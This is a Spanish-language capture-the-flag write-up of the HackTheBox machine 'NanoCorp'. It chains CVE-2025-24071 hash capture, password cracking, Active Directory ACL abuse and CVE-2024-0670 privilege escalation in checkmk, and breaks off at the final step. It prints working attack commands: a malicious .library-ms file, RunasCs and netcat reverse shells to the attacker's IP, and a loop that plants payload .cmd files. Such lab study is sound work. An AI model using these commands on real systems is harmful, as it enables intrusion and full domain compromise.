---
title: NanoCorp - Hard (HTB)
permalink: /NanoCorp-HTB-Writeup/
tags:
  - "Windows"
  - Hard
  - CVE-2025-24071
  - BloodHound
  - "ACL Rights"
  - AddSelf
  - ForceChangePassword
  - "Protected Users"
  - Kerberos
  - CVE-2024-0670
  - checkmk
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: NanoCorp - Hard (HTB)
seo_description: Explota CVE-2025-24071 para conseguir credenciales, abusa de derechos ACL y explota CVE-2024-0670 en Checkmk para vencer NanoCorp.
excerpt: Explota CVE-2025-24071 para conseguir credenciales, abusa de derechos ACL y explota CVE-2024-0670 en Checkmk para vencer NanoCorp.
header:
  overlay_image: /assets/images/headers/nanocorp-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/nanocorp-hackthebox.jpg
---
![image-center](/assets/images/posts/nanocorp-hackthebox.png)
{: .align-center}

**Habilidades:** CVE-2025-24071 - Microsoft Windows File Explorer Spoofing Vulnerability, Domain Analysis - `Bloodhound`, Abusing AD ACL Rights - `AddSelf`, Abusing AD ACL Rights - `ForceChangePassword`, Bypassing `Protected Users` Group, Kerberos Client Setup, CVE-2024-0670 - Local Privilege Escalation via `checkmk` Writable Files [Privilege Escalation]
{: .notice--primary}

# Introducción

NanoCorp es una máquina Windows de dificultad `Hard` en la que debemos vulnerar un sitio web mediante CVE-2025-24071 para acceso inicial al capturar, descifrar un hash NetNTLMv2 y abusar de derechos ACL y evasión de restricciones del grupo `Protected Users`.

Una vez ganamos acceso, explotaremos la vulnerabilidad CVE-2024-0670 en el agente `checkmk`que que nos permitirá obtener privilegios máximos en el dominio a través de la ejecución de un archivo malicioso.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.93                   
PING 10.10.11.93 (10.10.11.93): 56 data bytes
64 bytes from 10.10.11.93: icmp_seq=0 ttl=127 time=139.323 ms

--- 10.10.11.93 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 139.323/139.323/139.323/0.000 ms
~~~


## Port Scanning 

Iniciaremos con un escaneo de puertos abiertos en la máquina víctima con el fin de identificar servicios expuestos. Primeramente utilizaremos el protocolo TCP/IPv4

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.93 -oG openPorts

Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 18:48 -0300
Nmap scan report for 10.10.11.93
Host is up (0.33s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
57770/tcp open  unknown
57774/tcp open  unknown
57800/tcp open  unknown
62454/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.06 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Realizaremos un segundo escaneo que intente identificar la versión y los servicios que encontramos en el escaneo anterior

~~~ bash
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49664,49668,57770,57774,57800,62454 -sVC 10.10.11.93 -oN services 
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 18:51 -0300
Nmap scan report for 10.10.11.93
Host is up (0.43s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-12-31 21:51:24Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/wsmans?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.nanocorp.htb
| Subject Alternative Name: DNS:dc01.nanocorp.htb
| Not valid before: 2025-04-06T22:58:43
|_Not valid after:  2026-04-06T23:18:43
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
57770/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
57774/tcp open  msrpc             Microsoft Windows RPC
57800/tcp open  msrpc             Microsoft Windows RPC
62454/tcp open  msrpc             Microsoft Windows RPC
Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-31T21:52:44
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.81 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos muchos servicios, tales como `DNS`, `HTTP`, `RPC`, `LDAP`, etc. Además, podemos ver el nombre del host y de un dominio de Active Directory, esto es una clara señal de que nos enfrentamos a un Controlador de Dominio.

Agregaremos esta información a nuestro archivo `/etc/hosts` para resolver correctamente el dominio a través de su dirección IP

``` bash
echo '10.10.11.93 nanocorp.htb dc01.nanocorp.htb' | sudo tee -a /etc/hosts 

10.10.11.93 nanocorp.htb dc01.nanocorp.htb
```


## Web Enumeration

Antes de ir hasta al sitio web, podemos escanear las tecnologías que el servidor web pueda estar utilizando para gestionar el contenido

``` bash
whatweb http://nanocorp.htb

http://nanocorp.htb [200 OK] Apache[2.4.58], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12], IP[10.10.11.93], JQuery, OpenSSL[3.1.3], PHP[8.2.12], Script, Title[Nanocorp]
```

Al navegar hacia `nanocorp.htb`, veremos la siguiente página inicial

![image-center](/assets/images/posts/nanocorp-1-hackthebox.png)
{: .align-center}

En la tarjeta `About Us`, encontraremos un botón que nos conducirá al subdominio `hire.nanocorp.htb`

![image-center](/assets/images/posts/nanocorp-2-hackthebox.png)
{: .align-center}

Agregaremos este subdominio a nuestro archivo `/etc/hosts` para poder navegar hasta él en la web

``` bash
sudo sed -i 's/nanocorp.htb$/& hire.nanocorp.htb/g' /etc/hosts
```

Al visitar `hire.nanocorp.htb`, veremos la siguiente página web donde podemos subir una solicitud de empleo.

> El servidor web parece solamente aceptar archivos `.zip`
{: .notice--warning}

![image-center](/assets/images/posts/nanocorp-3-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## CVE-2025-24071 - Microsoft Windows File Explorer Spoofing Vulnerability

Esta vulnerabilidad afecta a múltiples versiones de Windows 10, 11, Server 2012, 2016, 2019 y 2022. Permite a un atacante capturar hashes `NetNTLMv2` cuando la víctima extrae archivos `.library-ms` especialmente diseñados. 

> Un archivo `.library-ms` en Windows es un archivo de metadatos en formato XML que describe una biblioteca de documentos.
{: .notice--info}

### Understanding Vulnerability

La vulnerabilidad se produce en la forma en la que Windows File Explorer maneja los archivos `.library-ms` dentro de archivos comprimidos.

Cuando un archivo `.libary-ms` que contiene una ruta a nivel de red es extraída por el Explorador de Windows, este analiza automáticamente el contenido de este a través de un mecanismo integrado de indexación.

A continuación se muestra cómo luce un archivo `.library-ms` malicioso

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.X.X\evil</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

La extracción y procesamiento del archivo comprimido (que contiene el archivo `.library-ms` anterior) resulta en tráfico hacia el recurso a nivel de red que especificamos en el atributo `<url>`

### Exploiting

Existen varias pruebas de concepto disponibles en [`Github`](https://github.com/ThemeHackers/CVE-2025-24071) que nos permiten crear tanto el archivo `.library-ms` como un archivo comprimido `.zip` o `.rar`, el cual es necesario ya que se necesita que la víctima extraiga el contenido del comprimido para iniciar tráfico SMB hacia nuestra IP.

``` bash
# Clonamos el repositorio
git clone https://github.com/ThemeHackers/CVE-2025-24071
cd CVE-2025-24071

# Preparamos un entorno virtual
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

# Consturimos los archivos
python3 exploit.py -i 10.10.16.89 -f exploit
```

Antes de subir el `.zip` a la web, iniciaremos un servidor SMB con `responder` en nuestra máquina, el cual se encargará de gestionar el tráfico entrante

``` bash
sudo responder -I tun0 -dw

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]
    
...
<SNIP>
...
```

Una vez tengamos el comprimido final creado (`exploit.zip`), lo subiremos a la web de la siguiente manera

![image-center](/assets/images/posts/nanocorp-4-hackthebox.png)
{: .align-center}

En unos momentos recibiremos una conexión SMB del usuario `web_svc`, donde veremos un hash `NetNTLMv2`

``` bash
[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:09095f152d7ac507:B7004C39F0B949278582BDA074345EA6:010100000000000000A484CE1C7CDC014633FE90D6DB455000000000020008004E0059005600300001001E00570049004E002D005700500050005200410052004B00560030004600460004003400570049004E002D005700500050005200410052004B0056003000460046002E004E005900560030002E004C004F00430041004C00030014004E005900560030002E004C004F00430041004C00050014004E005900560030002E004C004F00430041004C000700080000A484CE1C7CDC01060004000200000008003000300000000000000000000000002000006397495A6822FED4D500A757289FF1D1C241E2252867B42DBADCFBEAF9379EBF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310031000000000000000000
```

Guardaremos este hash en un archivo para intentar descifrarlo con herramientas como `john` o `hashcat`

``` bash
john --wordlist=/usr/local/share/wordlists/rockyou.txt hash.txt                
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
dksehdgh712!@#   (web_svc)
1g 0:00:00:02 DONE (2025-11-09 00:19) 0.3424g/s 635145p/s 635145c/s 635145C/s dksf773y..dkny809
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session complete
```

En este caso logramos descifrar la contraseña debido a que es débil y se encuentra dentro del diccionario `rockyou.txt`.

Si no confiamos porque ella nos rompió el corazón, podemos validar las credenciales de `web_svc` con la herramienta `netexec`

``` bash
nxc smb 10.10.11.93 -u 'web_svc' -p 'dksehdgh712!@#'
SMB         10.10.11.93   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.93   445    DC01             [+] nanocorp.htb\web_svc:dksehdgh712!@#
```


## Domain Analysis - `Bloodhound`

Podemos usar la herramienta `bloodhound-ce-python` para recolectar información del dominio, posteriormente con `Bloohound` buscaremos vías potenciales de movimiento lateral o escalada de privilegios

``` bash
bloodhound-ce-python -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' -ns 10.10.11.93 -c All
  
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: nanocorp.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.nanocorp.htb
INFO: Found 6 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.nanocorp.htb
INFO: Done in 00M 49S
```


## Abusing AD ACL Rights - `AddSelf`

La cuenta `web_svc` posee derechos `AddSelf` sobre el grupo `IT_Support`, esto le permite añadirse como miembro de este grupo

![image-center](/assets/images/posts/nanocorp-5-hackthebox.png)
{: .align-center}

Usando una herramienta como `bloodyAD` podremos añadirnos al grupo `IT_Support` cómodamente

``` bash
bloodyAD --host DC01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' add groupMember 'IT_Support' 'web_svc'

[+] web_svc added to IT_Support
```


## Abusing AD ACL Rights - `ForceChangePassword`

El grupo `IT_Support` posee derechos `ForceChangePassword` sobre la cuenta `monitoring_svc`, esto le permite a los miembros del grupo forzar un cambio de contraseña sobre esta cuenta

![image-center](/assets/images/posts/nanocorp-6-hackthebox.png)
{: .align-center}

Como el usuario `web_svc` ahora forma parte del grupo `IT_Support`, podremos aprovechar este derecho para cambiar la contraseña de `monitoring_svc`.

Cambiaremos la contraseña de la cuenta `monitoring_svc` de la siguiente manera, en mi caso usé `bloodyAD`, pero incluso puedes usar `rpcclient` XD

``` bash
bloodyAD --host DC01.nanocorp.htb -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' set password monitoring_svc 'Password123!'

[+] Password changed successfully!
```


## Bypassing `Protected Users` Group

La cuenta  `monitoring_svc` se encuentra dentro del grupo `Protected Users`, esto aplica una serie de [protecciones](https://learn.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/protected-users-security-group#domain-controller-protections-for-protected-users) a sus miembros.

> El grupo de **Usuarios Protegidos** (`Protected Users`) es un grupo de seguridad global de Active Directory diseñado para **mitigar los ataques de robo de credenciales** al imponer restricciones estrictas y no configurables en la autenticación Kerberos.
{: .notice--info}

Dentro de las restricciones aplicadas a los miembros de `Protected Users`, encontraremos las siguientes:

- Deshabilita la **autenticación NTLM**.
- Limita la vida útil de los TGT se reduce a un máximo de **4 horas**
- No se permite la **renovación de los TGT** más allá de las 4 horas iniciales.
- Desactiva la suplantación de identidad mediante la **delegación `kerberos`**.
- Restringe tipos de cifrado DES o RC4 en la autenticación previa de `kerberos`.
- Desactiva el **almacenamiento en caché** de claves de cifrado a largo plazo `kerberos.

![image-center](/assets/images/posts/nanocorp-7-hackthebox.png)
{: .align-center}

Podemos comprobar la restricción de la cuenta con `netexec`

``` bash
nxc smb DC01.nanocorp.htb -u monitoring_svc -p 'Password123!'

SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.93     445    DC01             [-] nanocorp.htb\monitoring_svc:Password123! STATUS_ACCOUNT_RESTRICTION
```

Aunque se deshabilite la autenticación NTLM, podremos continuar utilizando `kerberos`

``` bash
nxc smb DC01.nanocorp.htb -u monitoring_svc -p 'Password123!' -k

SMB         DC01.nanocorp.htb 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.nanocorp.htb 445    DC01             [+] nanocorp.htb\monitoring_svc:Password123!
```

### Kerberos Client Setup

Podremos solicitar un TGT para la cuenta `monitoring_svc` fácilmente con la herramienta `impacket-getTGT`

``` bash
getTGT.py 'nanocorp.htb/monitoring_svc:Password123!' -dc-ip DC01.nanocorp.htb

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in monitoring_svc.ccache
```

Como estamos obligados a utilizar `kerberos` para conectarnos con la cuenta `monitoring_svc` al dominio, configuraremos el entorno `kerberos` necesario en nuestra máquina para que pueda encontrar al KDC (`Key Distribution Center`), y así conectarnos con herramientas como `evil-winrm` o `evil-winrm-py`.

Para generar un archivo `krb5.conf`, podemos usar `netexec` de la siguiente forma (no se necesita autenticación para generar el archivo)

``` bash
nxc smb DC01.nanocorp.htb --generate-krb5-file ./krb5.conf

SMB         10.10.11.93     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.93     445    DC01             [+] krb5 conf saved to: ./krb5.conf
SMB         10.10.11.93     445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5.conf
```

Para aplicar la configuración, si no generaste el archivo directamente en `/etc/krb5.conf`, debemos definir la variable de entorno que nos sugieren

``` bash
export KRB5_CONFIG=./krb5.conf
```


## Shell as `monitoring_svc`

Con la configuración preparada, podremos conectarnos con el ticket que obtuvimos empleando la herramienta `evil-winrm-py`

``` bash
KRB5CCNAME=monitoring_svc.ccache evil-winrm-py -i dc01.nanocorp.htb --ssl -k --no-pass
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'dc01.nanocorp.htb:5986' as 'monitoring_svc@NANOCORP.HTB'
evil-winrm-py PS C:\Users\monitoring_svc\Documents> whoami
nanocorp\monitoring_svc
```

Ya podremos ver la flag del usuario sin privilegios

``` powershell
evil-winrm-py PS C:\Users\monitoring_svc\Documents> type ../Desktop/user.txt
fc0...
```
<br>


# Escalada de Privilegios
---
## CVE-2024-0670 - Local Privilege Escalation via `checkmk` Writable Files

[CVE-2024-0670](https://nvd.nist.gov/vuln/detail/cve-2024-0670) es una vulnerabilidad de escala de de privilegios local en Windows que afecta al componente del agente de Windows en `checkmk` anterior a las versiones `2.2.0p23`, `2.1.0p40` y `2.0.0` (EOL).

La vulnerabilidad explota archivos temporales que `checkmk` crea dentro del directorio `C:\Windows\Temp`. Un atacante puede manipular estos archivos para ejecutar código con privilegios máximos

### Understanding Vulnerability

El agente crea archivos con el patrón `cmk_{string}_{pid}_{counter}.cmd`, donde el valor de `PID` no es completamente predecible, pero Windows asigna este valor en orden ascendente, por lo que es posible intentar adivinar su valor mediante un bucle.

El atacante coloca muchas de copias de un ejecutable malicioso en `C:\Windows\Temp` con nombres que cubren el rango de `PIDs` probables y los marca como `Read-Only`.

Finalmente, el proceso de reparación del agente `checkmk` fuerza la escritura y ejecución de estos archivos temporales con privilegios de `SYSTEM`

### Scenario Analysis

El proceso que ejecuta el agente de `checkmk` es visible con comandos como `Get-Process`

``` powershell
evil-winrm-py PS C:\Users\monitoring_svc\Documents> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    114       8     3268       8332              4468   0 AggregatorHost
    203      13     3140      12544              7612   2 AzureArcSysTray
    234      15     3036      12676              3200   0 check_mk_agent
    103      11     1480       7464              4136   0 cmk-agent-ctl
...
<SNIP>
...
```

El instalador podemos encontrarlo dentro del directorio `C:\Windows\Installer`, solo que no sabemos con exactitud cuál es el que necesitamos ejecutar en el paso final

``` bash
PS C:\Windows\system32> dir C:\Windows\Installer\

    Directory: C:\Windows\Installer

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          4/2/2025   6:25 PM                {6070BE95-B84D-40FE-8ABD-C70B59F5A164}                               
d-----          4/5/2025   4:17 PM                {675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}                               
-a----         3/28/2025   3:08 PM       12637696 1e6f2.msi
-a----         5/10/2023   9:16 AM         184320 387c2.msi
-a----         5/10/2023   9:21 AM         184320 387c6.msi
-a----         5/10/2023   9:35 AM         192512 387ca.msi
-a----         5/10/2023   9:39 AM         192512 387ce.msi
-a----          4/2/2025   6:24 PM       60895232 387d1.msi
-a----          4/2/2025   6:24 PM          20480 SourceHash{0025DD72-A959-45B5-A0A3-7EFEB15A8050}                     
-a----          4/2/2025   6:25 PM          20480 SourceHash{6070BE95-B84D-40FE-8ABD-C70B59F5A164}                     
-a----          4/5/2025   4:17 PM          20480 SourceHash{675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}                     
-a----          4/2/2025   6:24 PM          20480 SourceHash{73F77E4E-5A17-46E5-A5FC-8A061047725F}                     
-a----          4/2/2025   6:24 PM          20480 SourceHash{C2C59CAB-8766-4ABD-A8EF-1151A36C41E5}                     
-a----          4/2/2025   6:24 PM          20480 SourceHash{D5D19E2F-7189-42FE-8103-92CD1FA457C2} 
```

### `MSI` by `monitoring_svc`

Cuando ejecutamos el instalador para intentar la reparación según la prueba de concepto, veremos un detalle que nos impide explotar la vulnerabilidad

``` bash
evil-winrm-py PS C:\Programdata> msiexec /fa C:\Windows\Installer\1e6f2.msi /L*V "C:\Programdata\monitoring_svc.log"

evil-winrm-py PS C:\Programdata> gc monitoring_svc.log

=== Verbose logging started: 11/11/2025  17:39:35  Build type: SHIP UNICODE 5.00.10011.00  Calling process: C:\Windows\system32\msiexec.exe ===
MSI (c) (58:B8) [17:39:35:636]: Resetting cached policy values
MSI (c) (58:B8) [17:39:35:636]: Machine policy value 'Debug' is 0
MSI (c) (58:B8) [17:39:35:636]: ******* RunEngine:
           ******* Product: {675A6D5C-FF5A-11EF-AEA3-1967AD678D6D}
           ******* Action: 
           ******* CommandLine: **********
MSI (c) (58:B8) [17:39:35:636]: Client-side and UI is none or basic: Running entire install on the server.
MSI (c) (58:B8) [17:39:35:667]: Grabbed execution mutex.
MSI (c) (58:B8) [17:39:35:683]: Failed to connect to server. Error: 0x80070005

MSI (c) (58:B8) [17:39:35:683]: Note: 1: 2774 2: 0x80070005 
1: 2774 2: 0x80070005 
MSI (c) (58:B8) [17:39:35:683]: Failed to connect to server.
MSI (c) (58:B8) [17:39:35:683]: MainEngineThread is returning 1601
=== Verbose logging stopped: 11/11/2025  17:39:35 ===
```

> El código de error MSI `0x80070005` significa **"Acceso denegado"** y generalmente ocurre cuando una aplicación o servicio no tiene los permisos necesarios para acceder a un archivo o carpeta, lo que impide la instalación, actualización o ejecución.
{: .notice--info}

Es probable que necesitemos ejecutar esta acción con el usuario `web_svc`, intentaremos conectarnos como este usuario

### Shell as `web_svc`

La cuenta `web_svc` no puede conectarse directamente al dominio ya que no es miembro de `Remote Management Users`. 

> Podemos usar la herramienta [`RunasCs.exe`](https://github.com/antonioCoco/RunasCs) para ejecutar comandos en el sistema en nombre de este usuario.
{: .notice--warning}

Comenzaremos cargando el binario compilado de esta herramienta en el directorio actual de trabajo (en mi caso me moví a una ruta de escritura global, como `C:\Programdata`)

``` bash
evil-winrm-py PS C:\Programdata> upload RunasCs.exe .
```

Desde nuestra máquina atacante iniciaremos un listener que se encargue de recibir una conexión que generaremos ahora

``` bash
rlwrap nc -lvnp 443
```

`RunasCs.exe` ofrece la funcionalidad de otorgar una consola mediante una reverse shell directamente siguiendo la siguiente sintaxis

``` bash
evil-winrm-py PS C:\Programdata> .\RunasCs.exe web_svc 'dksehdgh712!@#' powershell.exe -r 10.10.15.64:443

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-129260d$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 9616 created in background.
```

En nuestro listener recibiremos la shell del usuario `web_svc`

``` bash
rlwrap nc -lvnp 443  
Connection from 10.10.11.93:56916
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nanocorp\web_svc
```

### `MSI` by `web_svc`

Al ejecutar la herramienta de instalación con la cuenta `web_svc`, notaremos que esta si tiene permisos para ejecutar acciones de instalación, aunque igualmente falla, pero durante una operación interna.

> Este paso además nos ayuda a verificar el instalador correcto, nota cómo la primera línea nos da una pista de que se trata del agente de `Checkmk`.
{: .notice--info}

``` bash
PS C:\Programdata> msiexec /fa C:\Windows\Installer\1e6f2.msi /L*V "C:\Programdata\web_svc.log"
PS C:\Programdata> Get-Content checkmk_web_svc.log -Tail 20 

MSI (s) (D8:C8) [16:42:03:947]: Windows Installer reconfigured the product. Product Name: Check MK Agent 2.1. Product Version: 2.1.0.50010. Product Language: 1033. Manufacturer: tribe29 GmbH. Reconfiguration success or error status: 1603.

MSI (s) (D8:C8) [16:42:03:947]: Deferring clean up of packages/files, if any exist
MSI (s) (D8:C8) [16:42:03:947]: MainEngineThread is returning 1603
MSI (s) (D8:F0) [16:42:03:963]: RESTART MANAGER: Session closed.
MSI (s) (D8:F0) [16:42:03:963]: No System Restore sequence number for this installation.
=== Logging stopped: 11/9/2025  16:42:03 ===
MSI (s) (D8:F0) [16:42:03:963]: User policy value 'DisableRollback' is 0
MSI (s) (D8:F0) [16:42:03:963]: Machine policy value 'DisableRollback' is 0
MSI (s) (D8:F0) [16:42:03:963]: Incrementing counter to disable shutdown. Counter after increment: 0
MSI (s) (D8:F0) [16:42:03:963]: Note: 1: 1402 2: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Installer\Rollback\Scripts 3: 2 
MSI (s) (D8:F0) [16:42:03:963]: Note: 1: 1402 2: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Installer\Rollback\Scripts 3: 2 
MSI (s) (D8:F0) [16:42:03:963]: Decrementing counter to disable shutdown. If counter >= 0, shutdown will be denied.  Counter after decrement: -1
MSI (s) (D8:F0) [16:42:03:963]: Destroying RemoteAPI object.
MSI (s) (D8:BC) [16:42:03:963]: Custom Action Manager thread ending.
MSI (c) (94:2C) [16:42:03:963]: Decrementing counter to disable shutdown. If counter >= 0, shutdown will be denied.  Counter after decrement: -1
MSI (c) (94:2C) [16:42:03:963]: MainEngineThread is returning 1603
=== Verbose logging stopped: 11/9/2025  16:42:03 ===
```

### AV Bypass

Notaremos que el antivirus se encuentra activado al intentar ejecutar un binario malicioso

``` bash
evil-winrm-py PS C:\Programdata> .\payload.exe
Program 'payload.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\payload.exe
+ ~~~~~~~~~~~~~.
```

Subiremos el binario compilado de [`netcat`](https://github.com/int0x33/nc.exe/) para facilitar el proceso de enviar una reverse shell

``` bash
evil-winrm-py PS C:\Programdata> upload nc64.exe .
```

Crearemos un archivo `.bat` que ejecuta una shell con `netcat` hacia nuestra IP, por un puerto determinado

``` vb
@echo off

cmd /c C:\Programdata\nc64.exe -e powershell 10.10.15.64 4444 
```

### Exploiting

Podemos utilizar la siguiente [prueba de concepto](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/) para seguir los pasos y explotar esta vulnerabilidad.

Para el primer paso, es necesario encontrar el nombre de archivo que `checkmk` utilizará. Recordemos que la aplicación crea archivos temporales con el nombre `cmk_{string}_{process_id}_{counter}.cmd`, donde la cadena `string` siempre figura como `"all"`, el valor de `counter` es `0`.

El valor de `PID` puede ser definido mediante un bucle con un rango de `IDs` probables.

> Podemos ejecutar el bucle tanto como `web_svc` como `monitoring_svc`
{: .notice--warning}

~~~ powershell
evil-winrm-py PS C:\Programdata> 1000..10000 | foreach { copy C:\Programdata\rev.bat C:\Windows\Temp\cmk_all_${_}_1.cmd; Set-ItemProperty -path C:\Windows\Temp\cmk_all_${_}_1.cmd -name IsReadOnly -value $true; }
~~~

### (Optional) Cleanup 

Si listamos los permisos sobre la carpeta `Temp`, el usuario `web_svc` tiene acceso completo

``` bash
PS C:\Windows\system32> icacls C:\Windows\Temp
C:\Windows\Temp BUILTIN\Users:(CI)(S,WD,AD,X)
                BUILTIN\Administrators:(F)
                BUILTIN\Administrators:(OI)(CI)(IO)(F)
                NT AUTHORITY\SYSTEM:(F)
                NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                CREATOR OWNER:(OI)(CI)(IO)(F)
                NANOCORP\web_svc:(OI)(CI)(F)
                
Successfully processed 1 files; Failed processing 0 files
```

Podemos eliminar los archivos desde una consola con la shell de `web_svc`

``` bash
PS C:\Programdata> Remove-Item -Path C:\Windows\Temp\cmk_all_* -Recurse -Force
```


## Root Time

Iniciaremos un listener por un puerto que se encargue de recibir la shell. En mi caso, el `4444`

``` bash
